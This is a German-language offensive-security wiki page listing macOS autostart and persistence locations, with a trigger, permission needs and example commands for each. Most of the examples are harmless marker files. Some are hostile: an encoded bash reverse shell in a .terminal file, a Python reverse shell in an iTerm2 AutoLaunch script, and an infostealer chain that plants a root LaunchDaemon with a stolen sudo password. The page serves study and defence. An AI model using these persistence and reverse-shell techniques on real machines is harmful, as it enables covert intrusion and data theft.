# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Dieser Abschnitt basiert größtenteils auf der Blogserie [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Ziel ist es, **weitere Autostart-Orte** (falls möglich) hinzuzufügen, anzugeben, **welche Techniken** heutzutage noch mit der neuesten Version von macOS (13.4) funktionieren, und die erforderlichen **Berechtigungen** zu spezifizieren.

## Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für einen **Sandbox Bypass** nützlich sind und es ermöglichen, einfach etwas auszuführen, indem man es **in eine Datei schreibt** und auf eine sehr **gewöhnliche** **Aktion**, eine bestimmte **Zeitspanne** oder eine **Aktion, die du normalerweise ausführen kannst**, innerhalb einer Sandbox wartet, ohne Root-Berechtigungen zu benötigen.

### Launchd

- Nützlich für einen Sandbox Bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Neustart
- Root erforderlich
- **`/Library/LaunchDaemons`**
- **Trigger**: Neustart
- Root erforderlich
- **`/System/Library/LaunchAgents`**
- **Trigger**: Neustart
- Root erforderlich
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Neustart
- Root erforderlich
- **`~/Library/LaunchAgents`**
- **Trigger**: Erneute Anmeldung
- **`~/Library/LaunchDemons`**
- **Trigger**: Erneute Anmeldung

> [!TIP]
> Als interessante Tatsache enthält **`launchd`** eine eingebettete Property List im Mach-o-Abschnitt `__Text.__config`, die weitere bekannte Services enthält, die launchd starten muss. Außerdem können diese Services `RequireSuccess`, `RequireRun` und `RebootOnSuccess` enthalten, was bedeutet, dass sie ausgeführt werden und erfolgreich abgeschlossen werden müssen.
>
> Natürlich kann sie aufgrund der Codesignierung nicht geändert werden.

#### Description & Exploitation

**`launchd`** ist der **erste** **Prozess**, der vom OX S-Kernel beim Start ausgeführt wird, und der letzte, der beim Herunterfahren beendet wird. Er sollte immer die **PID 1** haben. Dieser Prozess wird die in den **ASEP**-**Plists** angegebenen Konfigurationen in folgenden Verzeichnissen **lesen und ausführen**:

- `/Library/LaunchAgents`: Pro Benutzer installierte Agents, die vom Administrator installiert wurden
- `/Library/LaunchDaemons`: Systemweit verwendete Daemons, die vom Administrator installiert wurden
- `/System/Library/LaunchAgents`: Von Apple bereitgestellte Agents pro Benutzer.
- `/System/Library/LaunchDaemons`: Von Apple bereitgestellte systemweite Daemons.

Wenn sich ein Benutzer anmeldet, werden die Plists in `/Users/$USER/Library/LaunchAgents` und `/Users/$USER/Library/LaunchDemons` mit den **Berechtigungen des angemeldeten Benutzers** gestartet.

Der **Hauptunterschied zwischen Agents und Daemons besteht darin, dass Agents geladen werden, wenn sich der Benutzer anmeldet, während Daemons beim Systemstart geladen werden** (da es Services wie ssh gibt, die vor jedem Benutzerzugriff auf das System ausgeführt werden müssen). Agents können außerdem eine GUI verwenden, während Daemons im Hintergrund ausgeführt werden müssen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Es gibt Fälle, in denen ein **Agent vor der Anmeldung des Benutzers ausgeführt werden muss**. Diese werden **PreLoginAgents** genannt. Dies ist beispielsweise nützlich, um beim Anmelden unterstützende Technologien bereitzustellen. Sie sind ebenfalls in `/Library/LaunchAgents` zu finden (siehe [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ein Beispiel).

> [!TIP]
> Neue Konfigurationsdateien für Daemons oder Agents werden **nach dem nächsten Neustart oder mit** `launchctl load <target.plist>` **geladen**. Es ist **auch möglich, .plist-Dateien ohne diese Erweiterung zu laden** mit `launchctl -F <file>` (diese plist-Dateien werden jedoch nach einem Neustart nicht automatisch geladen).\
> Es ist ebenfalls möglich, sie mit `launchctl unload <target.plist>` **zu entladen** (der von ihnen angegebene Prozess wird beendet),
>
> Um **sicherzustellen, dass nichts** (wie beispielsweise ein Override) **einen** **Agent** oder **Daemon** **am** **Ausführen** **hindert**, führe Folgendes aus: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Alle vom aktuellen Benutzer geladenen Agents und Daemons auflisten:
```bash
launchctl list
```
#### Beispiel einer bösartigen LaunchDaemon-Kette (Passwortwiederverwendung)

Ein aktueller macOS-Infostealer verwendete ein **erbeutetes sudo-Passwort** wieder, um einen User-Agent und einen Root-LaunchDaemon abzulegen:<sup>[[1]](#references)</sup>

- Die Agent-Schleife nach `~/.agent` schreiben und sie ausführbar machen.
- Eine plist in `/tmp/starter` erzeugen, die auf diesen Agent verweist.
- Das gestohlene Passwort mit `sudo -S` wiederverwenden, um sie nach `/Library/LaunchDaemons/com.finder.helper.plist` zu kopieren, `root:wheel` zu setzen und sie mit `launchctl load` zu laden.
- Den Agent mit `nohup ~/.agent >/dev/null 2>&1 &` unauffällig starten, um die Ausgabe zu trennen.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Wenn ein plist einem Benutzer gehört, wird die **task auch dann als Benutzer** und nicht als root **ausgeführt**, wenn sie sich in systemweiten Daemon-Ordnern befindet. Dies kann einige Privilege-Escalation-Angriffe verhindern.

#### Weitere Informationen zu launchd

**`launchd`** ist der **erste User-Mode-Prozess**, der vom **Kernel** gestartet wird. Der Prozessstart muss **erfolgreich** sein und er **darf weder beendet werden noch abstürzen**. Er ist sogar gegen einige **Killing-Signale geschützt**.

Eine der ersten Aufgaben von `launchd` ist es, alle **Daemons** zu **starten**, zum Beispiel:

- **Timer-Daemons**, die anhand der Ausführungszeit gestartet werden:
- atd (`com.apple.atrun.plist`): Hat ein `StartInterval` von 30min
- crond (`com.apple.systemstats.daily.plist`): Hat ein `StartCalendarInterval`, um um 00:15 zu starten
- **Network-Daemons** wie:
- `org.cups.cups-lpd`: Lauscht über TCP (`SockType: stream`) mit `SockServiceName: printer`
- SockServiceName muss entweder ein Port oder ein Service aus `/etc/services` sein
- `com.apple.xscertd.plist`: Lauscht auf TCP-Port 1640
- **Path-Daemons**, die ausgeführt werden, wenn sich ein bestimmter Pfad ändert:
- `com.apple.postfix.master`: Überprüft den Pfad `/etc/postfix/aliases`
- **IOKit-Notifications-Daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach-Port:**
- `com.apple.xscertd-helper.plist`: Der Eintrag `MachServices` gibt den Namen `com.apple.xscertd.helper` an
- **UserEventAgent:**
- Dies unterscheidet sich vom vorherigen Beispiel. Es sorgt dafür, dass launchd als Reaktion auf ein bestimmtes Event Apps startet. In diesem Fall ist das wichtigste Binary jedoch nicht `launchd`, sondern `/usr/libexec/UserEventAgent`. Es lädt Plugins aus dem durch SIP eingeschränkten Ordner `/System/Library/UserEventPlugins/`, wobei jedes Plugin seinen Initializer im Key `XPCEventModuleInitializer` oder bei älteren Plugins im `CFPluginFactories`-Dict unter dem Key `FB86416D-6164-2070-726F-70735C216EC0` seiner `Info.plist` angibt.

### Shell-Startdateien

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Du musst jedoch eine App finden, die über einen TCC Bypass verfügt und eine Shell ausführt, die diese Dateien lädt

#### Speicherorte

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Öffnen eines Terminals mit zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Öffnen eines Terminals mit zsh
- Root erforderlich
- **`~/.zlogout`**
- **Trigger**: Beenden eines Terminals mit zsh
- **`/etc/zlogout`**
- **Trigger**: Beenden eines Terminals mit zsh
- Root erforderlich
- Potenziell weitere in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Öffnen eines Terminals mit bash
- `/etc/profile` (funktionierte nicht)
- `~/.profile` (funktionierte nicht)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Sollte mit xterm ausgelöst werden, aber xterm **ist nicht installiert**. Auch nach der Installation wird dieser Fehler ausgegeben: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Beschreibung & Exploitation

Beim Initiieren einer Shell-Umgebung wie `zsh` oder `bash` werden **bestimmte Startdateien ausgeführt**. macOS verwendet derzeit `/bin/zsh` als Standardshell. Diese Shell wird automatisch geöffnet, wenn die Terminal-Anwendung gestartet oder über SSH auf ein Gerät zugegriffen wird. Obwohl `bash` und `sh` ebenfalls in macOS vorhanden sind, müssen sie explizit aufgerufen werden, um sie zu verwenden.<sup>[[2]](#references)</sup>

Die man page von zsh, die wir mit **`man zsh`** lesen können, enthält eine ausführliche Beschreibung der Startdateien.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Erneut geöffnete Anwendungen

> [!CAUTION]
> Das Konfigurieren der angegebenen Exploitation und das Ab- und wieder Anmelden oder sogar ein Neustart haben die App beim Testen nicht ausgeführt. Die App muss möglicherweise ausgeführt werden, wenn diese Aktionen durchgeführt werden.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Auslöser**: Beim Neustart werden Anwendungen erneut geöffnet

#### Beschreibung und Exploitation

Alle erneut zu öffnenden Anwendungen befinden sich in der plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Damit die erneut zu öffnenden Anwendungen deine eigene Anwendung starten, musst du sie lediglich **zur Liste hinzufügen**.

Die UUID kann durch Auflisten dieses Verzeichnisses oder mit `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` gefunden werden.

Um die Anwendungen zu überprüfen, die erneut geöffnet werden, kannst du Folgendes ausführen:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Um **eine Anwendung zu dieser Liste hinzuzufügen**, kannst du Folgendes verwenden:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal verfügt über die FDA-Berechtigungen des Benutzers, der es verwendet

#### Ort

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Auslöser**: Terminal öffnen

#### Beschreibung & Ausnutzung

In **`~/Library/Preferences`** werden die Einstellungen des Benutzers für die Applications gespeichert. Einige dieser Einstellungen können eine Konfiguration zum **Ausführen anderer Applications/Scripts** enthalten.<sup>[[5]](#references)</sup>

Beispielsweise kann Terminal beim Startup einen Befehl ausführen:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Diese Konfiguration wird in der Datei **`~/Library/Preferences/com.apple.Terminal.plist`** wie folgt widergespiegelt:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Wenn die plist der Terminal-Einstellungen im System überschrieben werden könnte, kann die **`open`**-Funktion verwendet werden, um **das Terminal zu öffnen, woraufhin dieser Befehl ausgeführt wird**.

Dies kann über die CLI hinzugefügt werden:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Andere Dateierweiterungen

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal verwendet die FDA-Berechtigungen des Benutzers, der es verwendet

#### Ort

- **Überall**
- **Trigger**: Terminal öffnen

#### Beschreibung & Exploitation

Wenn du ein [**`.terminal`-Skript**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) erstellst und es öffnest, wird die **Terminal-Anwendung** automatisch aufgerufen, um die darin angegebenen Befehle auszuführen. Wenn die Terminal-App über besondere Berechtigungen verfügt (z. B. TCC), wird dein Befehl mit diesen besonderen Berechtigungen ausgeführt.

Probiere es aus mit:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Du könntest auch die Erweiterungen **`.command`**, **`.tool`** mit regulärem Inhalt von Shell-Scripts verwenden; sie werden ebenfalls von Terminal geöffnet.

> [!CAUTION]
> Wenn Terminal über **Full Disk Access** verfügt, kann es diese Aktion abschließen (beachte, dass der ausgeführte Befehl in einem Terminalfenster sichtbar sein wird).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Du könntest zusätzlichen TCC access erhalten

#### Speicherort

- **`/Library/Audio/Plug-Ins/HAL`**
- Root erforderlich
- **Trigger**: coreaudiod oder den Computer neu starten
- **`/Library/Audio/Plug-ins/Components`**
- Root erforderlich
- **Trigger**: coreaudiod oder den Computer neu starten
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod oder den Computer neu starten
- **`/System/Library/Components`**
- Root erforderlich
- **Trigger**: coreaudiod oder den Computer neu starten

#### Beschreibung

Laut den vorherigen Writeups ist es möglich, **einige Audio Plugins zu kompilieren** und sie laden zu lassen.<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Du könntest zusätzlichen TCC access erhalten

#### Speicherort

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beschreibung & Exploitation

QuickLook Plugins können ausgeführt werden, wenn du **die Vorschau einer Datei auslöst** (drücke die Leertaste, während die Datei im Finder ausgewählt ist) und ein **Plugin, das diesen Dateityp unterstützt**, installiert ist.<sup>[[8]](#references)</sup>

Es ist möglich, ein eigenes QuickLook Plugin zu kompilieren, es an einem der vorherigen Speicherorte abzulegen, damit es geladen wird, und anschließend zu einer unterstützten Datei zu navigieren und die Leertaste zu drücken, um es auszulösen.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Dies hat bei mir weder mit dem Benutzer-LoginHook noch mit dem Root-LogoutHook funktioniert.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Du musst in der Lage sein, etwas wie `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` auszuführen.
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Sie sind veraltet, können aber verwendet werden, um Befehle auszuführen, wenn sich ein Benutzer anmeldet.<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Diese Einstellung wird in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` gespeichert.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Zum Löschen:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Der Eintrag für den Root-Benutzer befindet sich unter **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bedingte Sandbox-Umgehung

> [!TIP]
> Hier findest du Startorte, die für eine **Sandbox-Umgehung** nützlich sind. Dadurch kannst du etwas einfach ausführen, indem du es **in eine Datei schreibst** und auf nicht besonders häufige Bedingungen wie bestimmte **installierte Programme, „ungewöhnliche“ Benutzeraktionen** oder Umgebungen setzt.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- Du musst jedoch in der Lage sein, die Binärdatei `crontab` auszuführen
- Oder du musst Root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Für direkten Schreibzugriff ist Root erforderlich. Kein Root erforderlich, wenn du `crontab <file>` ausführen kannst
- **Auslöser**: Hängt vom Cron-Job ab

#### Beschreibung & Ausnutzung

Liste die Cron-Jobs des **aktuellen Benutzers** mit:
```bash
crontab -l
```
Sie können auch alle cron jobs der Benutzer in **`/usr/lib/cron/tabs/`** und **`/var/at/tabs/`** sehen (erfordert root).

Unter MacOS finden sich mehrere Ordner, in denen Skripte mit **bestimmter Häufigkeit** ausgeführt werden:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Dort findet man die regulären **cron**-**jobs**, die **at**-**jobs** (nicht sehr häufig verwendet) und die **periodic**-**jobs** (hauptsächlich zum Löschen temporärer Dateien verwendet). Die täglichen **periodic**-**jobs** können beispielsweise mit `periodic daily` ausgeführt werden.<sup>[[10]](#references)</sup>

Um programmgesteuert einen **user cronjob** hinzuzufügen, kann Folgendes verwendet werden:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 hatte früher erteilte TCC-Berechtigungen

#### Speicherorte

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Auslöser**: iTerm öffnen
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Auslöser**: iTerm öffnen
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Auslöser**: iTerm öffnen

#### Beschreibung & Exploitation

In **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gespeicherte Scripts werden ausgeführt. Zum Beispiel:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
oder:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Das Script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** wird ebenfalls ausgeführt:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-Einstellungen unter **`~/Library/Preferences/com.googlecode.iterm2.plist`** können **einen Befehl angeben, der ausgeführt werden soll**, wenn das iTerm2-Terminal geöffnet wird.

Diese Einstellung kann in den iTerm2-Einstellungen konfiguriert werden:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Und der Befehl wird in den Einstellungen angezeigt:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Sie können den auszuführenden Befehl mit Folgendem festlegen:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Höchstwahrscheinlich gibt es **weitere Möglichkeiten, die iTerm2-Einstellungen zu missbrauchen**, um beliebige Befehle auszuführen.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- xbar muss jedoch installiert sein
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Berechtigungen für Bedienungshilfen an

#### Speicherort

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Auslöser**: Sobald xbar ausgeführt wird

#### Beschreibung

Wenn das beliebte Programm [**xbar**](https://github.com/matryer/xbar) installiert ist, kann ein Shell-Skript in **`~/Library/Application\ Support/xbar/plugins/`** geschrieben werden, das beim Start von xbar ausgeführt wird:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Nützlich, um sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Hammerspoon muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Accessibility-Berechtigungen an

#### Speicherort

- **`~/.hammerspoon/init.lua`**
- **Auslöser**: Sobald Hammerspoon ausgeführt wird

#### Beschreibung

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dient als Automatisierungsplattform für **macOS** und verwendet für seine Abläufe die **LUA scripting language**. Besonders hervorzuheben ist die Unterstützung der Integration vollständiger AppleScript-Codes sowie der Ausführung von Shell-Skripten, wodurch seine scripting capabilities erheblich erweitert werden.<sup>[[13]](#references)</sup>

Die App sucht nach einer einzelnen Datei, `~/.hammerspoon/init.lua`, und beim Start wird das Skript ausgeführt.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- BetterTouchTool muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Automation-Shortcuts- und Accessibility-Berechtigungen an

#### Speicherort

- `~/Library/Application Support/BetterTouchTool/*`

Dieses Tool ermöglicht es, Anwendungen oder Skripte anzugeben, die ausgeführt werden sollen, wenn bestimmte Shortcuts gedrückt werden. Ein Angreifer könnte möglicherweise in der Datenbank einen eigenen **Shortcut und eine auszuführende Aktion konfigurieren**, damit beliebiger Code ausgeführt wird (ein Shortcut könnte einfach das Drücken einer Taste sein).

### Alfred

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- Alfred muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Automation-, Accessibility- und sogar Full-Disk access-Berechtigungen an

#### Speicherort

- `???`

Es ermöglicht das Erstellen von Workflows, die Code ausführen können, wenn bestimmte Bedingungen erfüllt sind. Potenziell könnte ein Angreifer eine Workflow-Datei erstellen und Alfred dazu bringen, sie zu laden (für die Nutzung von Workflows muss die Premium-Version erworben werden).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- ssh muss jedoch aktiviert und verwendet werden
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH hat Zugriff auf FDA

#### Speicherort

- **`~/.ssh/rc`**
- **Auslöser**: Login via ssh
- **`/etc/ssh/sshrc`**
- Root erforderlich
- **Auslöser**: Login via ssh

> [!CAUTION]
> Zum Aktivieren von ssh ist Full Disk Access erforderlich:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beschreibung & Exploitation

Standardmäßig werden die Skripte **`/etc/ssh/sshrc`** und **`~/.ssh/rc`** ausgeführt, wenn sich ein Benutzer **via SSH anmeldet**, sofern in `/etc/ssh/sshd_config` nicht `PermitUserRC no` gesetzt ist.<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- `osascript` muss jedoch mit Argumenten ausgeführt werden
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherorte

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Auslöser:** Login
- Exploit-Payload wird gespeichert und ruft **`osascript`** auf
